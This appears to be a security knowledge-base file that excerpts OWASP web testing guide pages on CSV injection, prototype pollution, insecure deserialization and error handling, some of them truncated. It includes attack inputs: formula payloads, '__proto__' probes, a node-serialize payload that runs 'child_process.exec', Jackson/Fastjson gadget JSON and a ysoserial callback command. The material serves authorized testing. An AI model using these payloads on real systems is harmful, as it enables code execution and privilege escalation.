    Spring MVC allows to automatically bind user input into object. Identify the controllers that handle state-changing requests (e.g. find the occurrences of `@RequestMapping`) then verify if controls are in place (both on the controller or on the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:

    -

    _(truncated — see the full WSTG test)_
- title: WSTG-INPV-21 Testing for CSV Injection
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-21 — Testing for CSV Injection

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-21) — CC BY-SA 4.0

    CSV Injection (also known as Formula Injection) occurs when an application embeds untrusted, user-controlled input into CSV (or other spreadsheet-compatible) exports and the resulting file is opened in a spreadsheet program (e.g., Microsoft Excel, LibreOffice Calc). Spreadsheet applications may interpret certain cell values as formulas, which can lead to security issues such as user deception (phishing-style workflows), manipulation of spreadsheet output, or data exfiltration. In some environments, formula injection can be escalated to higher impact via spreadsheet “gadgets” and legacy features (e.g., DDE / Dynamic Data Exchange behaviors), potentially reaching command execution on the workstation that opens the file-typically dependent on client configuration and/or user interaction.

    ### Test Objectives

    - Identify CSV/spreadsheet export features that include untrusted input.
    - Verify whether attacker-controlled values are interpreted as formulas when the export is opened in common spreadsheet applications.
    - Check whether separator/quote injection can move a dangerous prefix to the start of a cell.
    - Validate whether mitigations remain effective in Microsoft Excel after saving and re-opening the CSV.
    - Assess practical impact based on who opens the export and how it is used.

    ### How to Test

    ### Formula-Triggering Prefixes

    Cells beginning with the following characters may be interpreted as formulas by spreadsheet software:

    - Equals (`=`)
    - Plus (`+`)
    - Minus (`-`)
    - At (`@`)
    - Tab (`0x09`)
    - Carriage return (`0x0D`)
    - Line feed (`0x0A`)
    - Full-width (double-byte) variants such as `＝`, `＋`, `－`, `＠` (depending on locale/application behavior)

    > Important (Excel behavior): Microsoft Excel may remove quotes or escape characters from CSV cells when a file is saved and re-opened. As a result, some commonly suggested mitigations can fail after save/reopen and previously escaped formulas may become active again.

    Also note that it is not sufficient to ensure the *overall* untrusted input does not start with a dangerous character. Attackers may inject separators and quoting to start a new cell, placing the dangerous character at the beginning of a cell.

    ### Identify CSV Export Functionality and Data Sources

    Locate features that generate CSV/TSV or “export to spreadsheet” content:

    - Reports (users, transactions, audit logs, tickets)
    - Admin dashboards exporting lists
    - Email attachments generated by the application
    - Scheduled exports / integrations

    Identify untrusted data sources that can end up in the export:

    - User profiles (name, email, company)
    - Free-text fields (comments, ticket subjects, notes)
    - Imported/integrated external data (webhooks, CRM sync, partner feeds)

    Document which roles can trigger the export and which roles are likely to open it.

    ### Place Benign, Detectable Formula-Like Values into Candidate Fields

    Use harmless payloads to detect formula evaluation (avoid payloads that execute commands or perform uncontrolled network access).
    Test values that begin with each formula-triggering character:

    - `=1+1`
    - `+1+1`
    - `-1+1`
    - `@SUM(1,1)`
    - `=HYPERLINK("http://example.invalid/leak?test=1", "Click Me")`

    Notes:

    - The `HYPERLINK()` case is useful to demonstrate realistic impact (deception/phishing-style flows, or potential metadata exposure when a link is clicked/opened). Use a controlled endpoint during testing (e.g., a local listener or an internal test host).
    - Do not use external “real attacker” infrastructure in validation.

    Also test control-character and Unicode variants (where input handling allows it):

    - A value that begins with a tab character followed by `=1+1` (TAB + `=1+1`)
    - Full-width prefix variants (e.g., `＝1+1`)

    ### Test Separator and Quote “Cell Breakout” Scenarios

    Because CSV is cell-based, test whether you can inject content that starts a new cell and then begins with a dangerous character. This depends on:

    - Field separator (commonly `,` or `;`)
    - Quoting rules and escaping
    - Application-side CSV generation and encoding

    Example *benign* test patterns (adjust separator to the actual export format):

    - A value containing a quote and separator intended to create a new cell, then `=1+1`
    - A value containing a separator directly (if not quoted by the exporter), then `=1+1`

    Your objective is to see whether the resulting CSV contains any cell whose first character is one of the formula-triggering prefixes. Verify this by inspecting the raw CSV output in a text editor.

    ### Export and Verify in Spreadsheet Applications

    - Export/download the CSV.
    - Open it in at least one spreadsheet application used in the target environment (Excel and/or LibreOffice, etc.).
    - Confirm whether the cell is interpreted as a formula:
        - The spreadsheet displays the computed result (e.g., `2`) instead of the literal string (e.g., `=1+1`), and/or
        - The formula bar shows a formula rather than plain text.

    Record:

    - Application name/version (e.g., Microsoft Excel)
    - How the file was opened (double-click vs import wizard)
    - Whether locale settings influenced parsing

    ### Excel Save/Re-open Regression Test (Mitigation Reliability)

    If the application claims to escape/quote values:

    - Open the exported CSV in Microsoft Excel.
    - Save the file (e.g., as CSV).
    - Close and re-open it.
    - Re-check whether previously “neutralized” values became active formulas.

    This step is critical because Excel may normalize/remove certain escaping/quoting behaviors after save/reopen.

    ### Assess Impact

    Assess practical risk based on:

    - Who opens the file (privileged roles vs end users)
    - Whether exports are shared externally
    - Whether spreadsheet values are relied on for decisions (e.g., totals, flags, statuses)
    - Whether formulas could mislead users or trigger spreadsheet behaviors in your environment

    Provide a clear reproduction path:

    1. Where input is entered
    2. How export is generated
    3. Which program interprets it as a formula
    4. Evidence (screenshot or description) that evaluation occurs

    ### Higher-Impact Validation (Optional, Strictly Controlled)

    Some real-world cases show formula injection escalating beyond simple calculation/deception (e.g., via legacy spreadsheet features such as DDE). This behavior is highly environment-dependent.
- title: WSTG-INPV-22 Testing for Prototype Pollution
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-22 — Testing for Prototype Pollution

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-22) — CC BY-SA 4.0

    JavaScript is a prototype-based language. Almost every object inherits from `Object.prototype`, and any property that is not found directly on an object is looked up through the prototype chain. Prototype pollution occurs when an application uses attacker-controlled input to set the *keys* of an object during a recursive merge, clone, or path-based assignment, allowing the attacker to reach `Object.prototype` through a special key such as `__proto__`, `constructor`, or `prototype`. Because that prototype is shared by every object in the runtime, the injected property silently becomes visible to unrelated parts of the application.

    ### Test Objectives

    - Identify functions and libraries that recursively merge, clone, or assign user-controlled properties.
    - Determine whether user input can reach and modify `Object.prototype`.
    - Identify gadgets that turn prototype pollution into a concrete impact.

    ### How to Test

    The following example illustrates the root cause. A naive recursive merge copies every key of an attacker-controlled object into a target:

    ```javascript
    function merge(target, source) {
        for (const key in source) {
            if (typeof source[key] === "object" && typeof target[key] === "object") {
                merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
        return target;
    }
    ```

    If the source is parsed from user input such as `{"__proto__": {"polluted": "yes"}}`, the assignment walks into `__proto__` and writes onto `Object.prototype`. Afterwards every object in the runtime inherits the planted property:

    ```javascript
    merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
    ({}).polluted;   // "yes"  -> Object.prototype was polluted
    ```

    ### Black-Box Testing

    #### Identify the Sources

    Prototype pollution is reachable through any input whose keys end up as object property names. Review the application for:

    - URL query string and the URL fragment (hash), using bracket or dotted notation, e.g. `?__proto__[key]=value` or `?__proto__.key=value`.
    - JSON request bodies that are deserialized and then merged or cloned (configuration, profile, or settings endpoints are common candidates).
    - Other structured inputs parsed into nested objects, such as form data or cookies.

    #### Testing for Client-Side Prototype Pollution

    Submit a probe that attempts to set a uniquely-named property on the prototype through a candidate source. The two encodings below express the same intent:

    ```text
    https://example.com/#__proto__[testpolluted]=reflected
    https://example.com/#constructor[prototype][testpolluted]=reflected
    ```

    Then confirm in the browser developer console whether the property leaked onto the global prototype by reading it from a brand-new empty object:

    ```javascript
    ({}).testpolluted;
    // "reflected" -> Object.prototype is polluted via this source
    // undefined   -> not polluted through this source
    ```

    If the value is returned, the source is exploitable and the next step is to find a gadget that turns the polluted property into DOM XSS (for example, a property a library reads when building markup or configuring script behavior). Browser tooling that scans for both sources and gadgets, such as DOM Invader (see Tools), significantly speeds up this phase.

    #### Testing for Server-Side Prototype Pollution

    The tester cannot read the prototype from a console here, so detection is indirect: pollute a property and observe an externally visible change in behavior. Send a JSON body that nests the special key inside an otherwise normal object, targeting an endpoint that merges or clones request data:

    ```http
    POST /api/update HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {"name":"test","__proto__":{"json spaces":10}}
    ```

    A reliable, non-destructive indicator on Express applications is to pollute the `json spaces` property: if a later JSON response from the application comes back pretty-printed (indented) when it previously was not, the server read the indentation setting from the polluted prototype, confirming the vulnerability. Other behavioral indicators include:

    - A property the client never sent appearing in subsequent JSON responses.
    - A change in HTTP status, headers, or content negotiation after polluting a property the framework reads internally.
    - A distinctive error or parsing change for inputs that were previously accepted.

    #### Assess the Impact

    Because impact is gadget-dependent, analyze each confirmed pollution for realistic consequences. On the client-side this is most often DOM XSS or a bypass of a security control. On the server-side, gadgets have historically escalated to denial of service, authentication or authorization bypass, and remote code execution. Treat any confirmed prototype pollution as potentially high severity until gadget analysis rules out impact.

    ### Gray-Box Testing

    When source code is available, search for the vulnerable patterns directly instead of probing blindly.

    Look for recursive merge, clone, extend, or deep-assignment routines, whether hand-written or provided by a utility library. Functions that walk a nested path of keys and assign into an object are the primary sinks. A typical grep would target merge and assignment helpers, deep-clone utilities, and property access by user-controlled path.

    For each candidate sink, confirm whether keys are validated before assignment. Safe code rejects or skips `__proto__`, `constructor`, and `prototype`, or uses objects without a prototype:

    ```javascript
    // Vulnerable: blindly assigns into a nested key path
    target[key] = source[key];

    // Safer: refuse dangerous keys
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
        continue;
    }
    ```

    Also confirm the versions of any dependencies with known prototype pollution advisories, since many popular utilities have been patched over time. Where source code is available it is straightforward to trace user input from the request parser to these sinks and establish reachability, and to identify gadgets in the application or its dependencies.
- title: WSTG-INPV-23 Testing for Insecure Deserialization
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-23 — Testing for Insecure Deserialization

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-23) — CC BY-SA 4.0

    Data serialization is the process of converting an object into a format that can be stored
    (for example, in a file or database) or transmitted (for example, over a network) and
    reconstructed later. Deserialization is the reverse process: taking data structured from
    some format and rebuilding it into an object.

    ### Test Objectives

    - Identify entry points where the application accepts serialized objects from untrusted
      sources (for example, HTTP headers, parameters, or cookies).
    - Determine the serialization format used by the application.
    - Assess whether serialized input is validated or restricted prior to deserialization.
    - Evaluate whether manipulation of serialized data leads to unsafe behavior or security
      impact.

    ### How to Test

    ### Black-Box Testing

    #### Identification of Serialized Data

    Identify where the application processes serialized data. Inspect cookies, hidden fields,
    API bodies, headers, and file uploads for recognizable patterns, encodings, or structural
    characteristics.

    ##### Java Serialization

    Java serialized objects typically begin with the hex bytes `AC ED 00 05`. When base64
    encoded, this frequently appears as `rO0`.

    ```http
    Cookie: rememberMe=rO0ABXNyABpY...
    ```

    ##### PHP Serialization

    PHP serialization is human-readable and uses specific characters to represent data types
    (for example, `O` for object, `a` for array, `s` for string).

    ```http
    Cookie: user_data=O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"isAdmin";b:1;}
    ```

    ##### Python Pickle

    Python pickle is a binary format that may be harder to recognize visually. Protocol 0
    payloads are more readable and often end with a period (`.`). Higher protocols look like
    opaque binary or base64 blobs in cookies, tokens, or job/queue parameters.

    After fingerprinting a candidate, send a controlled out-of-band (OOB) or benign crash
    probe generated for pickle (for example a payload that performs a DNS or HTTP callback to
    a server you control). Confirm whether the application deserializes the value by watching
    for the callback, a distinctive error, or a process crash. Never start with a destructive
    RCE payload.

    ##### Node.js (node-serialize)

    In Node.js applications using the `node-serialize` library, serialized data is often
    represented as a JSON-like string. A key indicator of risk is an immediately invoked
    function expression (IIFE) marker that starts with `_$$ND_FUNC$$_`.

    ```javascript
    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}
    ```

    If you observe this marker in application traffic, replace the function body with a
    harmless OOB callback and resubmit to confirm execution.

    ##### .NET Serialization

    Legacy applications that still use `BinaryFormatter` or `NetDataContractSerializer` often
    encode the output in base64. A common pattern for .NET serialized data starts with the hex
    bytes `00 01 00 00 00 FF FF FF FF` or the base64 string `AAEAAAD/////`. Prefer treating
    `BinaryFormatter` as legacy-only; it is obsolete and removed from modern .NET.

    ```http
    Cookie: SessionData=AAEAAAD/////AQAAAAAAAAAMAgAAAF...
    ```

    ##### JSON-Based Deserialization with Type Metadata

    Some JSON libraries support polymorphic typing. If attacker-controlled type metadata is
    accepted, deserialization can instantiate unexpected classes.

    Jackson with default typing often includes a type ID such as `@class`:

    ```json
    {"@class":"com.example.Exploit","cmd":"id"}
    ```

    Fastjson commonly uses `@type`:

    ```json
    {"@type":"com.example.Exploit","cmd":"id"}
    ```

    Treat attacker-controlled `@class`, `@type`, or similar type specifiers as a high-priority
    finding, then confirm with a safe OOB gadget for that library.

    #### Manipulation of Serialized Objects

    Once an entry point is identified, modify the serialized data and observe how the
    application responds.

    Common manipulation techniques include:

    - Changing object attributes or flags.
    - Injecting additional fields.
    - Modifying data types.
    - Replaying modified serialized payloads.

    Example (PHP):

    A serialized object representing user state:

    ```php
    O:4:"User":2:{s:8:"username";s:3:"bob";s:8:"isAdmin";b:0;}
    ```

    If the application relies on this object for authorization decisions, change `b:0;` to
    `b:1;` and resubmit. Privilege escalation confirms insecure trust in the deserialized
    object. When editing string or array lengths, keep the PHP serialization length prefixes
    consistent or the parser will reject the payload.

    #### Testing for Dangerous Side Effects

    Check whether deserialization triggers unintended behavior, such as:

    - Execution of system commands.
    - Invocation of internal application functionality.
    - Excessive resource consumption (memory, CPU).
    - Application crashes or unexpected state changes.

    Look for evidence through:

    - Behavioral changes in responses.
    - Error messages or stack traces.
    - Timing anomalies or service degradation.
    - OOB DNS or HTTP callbacks from safe probe payloads.

    #### Gadget Chain Abuse

    In many environments, deserialization vulnerabilities require a gadget chain: a sequence
    of existing code fragments (gadgets) within the application or its dependencies that,
    during reconstruction, produce a malicious outcome.

    Test with this sequence:

    1. Identify third-party libraries in use (for example Commons Collections, Spring, or
       Jackson) from headers, errors, dependency files, or fingerprinting tools.
    2. Generate a non-destructive confirmation payload with a specialized tool.
    3. Submit the payload to the serialized-data sink and watch for an OOB callback. RCE often
       produces no direct response body, so DNS or HTTP callbacks are the reliable signal.

    Example (Java, using ysoserial's `URLDNS` gadget for confirmation only):

    ```bash
    java -jar ysoserial.jar URLDNS http://<collaborator-host>/
    ```

    Base64-encode the raw output if the application expects base64, place it in the candidate
    parameter or cookie, and resubmit. A DNS lookup for `<collaborator-host>` confirms that
    the application deserialized the object. Use RCE gadgets only after confirmation and only
    in authorized test environments.

    For PHP, use PHPGGC to generate an equivalent OOB or file-write proof payload for a known
    gadget chain present in the application.

    ### White-Box Testing

    #### Code Review and Sink Functions

    When source code is available, do not stop at finding sinks. Trace untrusted input to each
    sink and verify which controls exist.

    Common sinks include:

    - Java: `java.io.ObjectInputStream.readObject()`, `readUnshared()`
    - PHP: `unserialize()`
    - Python: `pickle.loads()`, `marshal.loads()`, `shelve.open()`
    - Node.js: `node-serialize.unserialize()`
    - .NET: `BinaryFormatter.Deserialize()`, `NetDataContractSerializer.Deserialize()`

    For each sink:

    1. Confirm whether request parameters, cookies, header

    _(truncated — see the full WSTG test)_
- title: WSTG-ERRH-01 Testing for Improper Error Handling
  service: http
  tech: errors
  doc_kind: wstg
  content: |-
    ## WSTG-ERRH-01 — Testing for Improper Error Handling

    Category: 08-Testing_for_Error_Handling  
    Source: OWASP WSTG (WSTG-ERRH-01) — CC BY-SA 4.0

    All types of applications (web apps, web servers, databases, etc.) will generate errors for various reasons. Developers often ignore handling these errors, or push away the idea that a user will ever try to trigger an error purposefully (*e.g.* sending a string where an integer is expected). When the developer only consider the happy path, they forget all other possible user-input the code can receive but can't handle.

    ### Test Objectives

    - Identify existing error output.
    - Analyze the different output returned.

    ### How to Test

    Errors are usually seen as benign as they provide diagnostics data and messages that could help the user understand the problem at hand, or for the developer to debug that error.

    By trying to send unexpected data, or forcing the system into certain edge cases and scenarios, the system or application will, most of the time, give out a bit on what's happening internally, unless the developers turned off all possible errors and return a certain custom message.

    ### Web Servers

    All web apps run on a web server, whether it was an integrated one or a fully fledged one. Web apps must handle and parse HTTP requests, and for that a web server is always part of the stack. Some of the most common web servers are Nginx, Apache, and IIS.

    Web servers have known error messages and formats. If one is not familiar with how they look, searching online for them would provide examples. Another way would be to look into their documentation, or simply setup a server locally and discover the errors by going through the pages that the web server uses.

    In order to trigger error messages, a tester must:

    - Search for random files and folders that will not be found (404s).
    - Try to request folders that exist and see the server behavior (403s, blank page, or directory listing).
    - Try sending a request that breaks the [HTTP RFC](https://tools.ietf.org/html/rfc7231). One example would be to send a very large path, break the headers format, or change the HTTP version.
        - Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.

    ### Applications

    Applications are the most susceptible to let out a wide variety of error messages, which include: stack traces, memory dumps, mishandled exceptions, and generic errors. This happens due to the fact that applications are custom built most of the time and the developers need to observe and handle all possible error cases (or have a global error catching mechanism), and these errors can appear from integrations with other services.

    In order to make an application throw these errors, a tester must:

    1. Identify possible input points where the application is expecting data.
    2. Analyse the expected input type (strings, integers, JSON, XML, etc.).
    3. Fuzz every input point based on the previous steps to have a more focused test scenario.
       - Fuzzing every input with all possible injections is not the best solution unless you have unlimited testing time and the application can handle that much input.
       - If fuzzing isn't an option, handpick viable inputs that have the highest chance to break a certain parser (*e.g.* a closing bracket for a JSON body, a large text where only a couple of characters are expected, CLRF injection with parameters that might be parsed by servers and input validation controls, special characters that aren't applicable for filenames, etc.).
       - Fuzzing with jargon data should be ran for every type as sometimes the interpreters will break outside of the developer's exception handling.
    4. Understand the service responding with the error message and try to make a more refined fuzz list to bring out more information or error details from that service (it could be a database, a standalone service, etc.).

    Error messages are sometimes the main weakness in mapping out systems, especially under a microservice architecture. If services are not properly set to handle errors in a generic and uniform manner, error messages would let a tester identify which service handles which requests, and allows for a more focused attack per service.

    > The tester needs to keep a vigilant eye for the response type. Sometimes errors are returned as success with an error body, hide the error in a 302, or simply by having a custom way of representing that error.
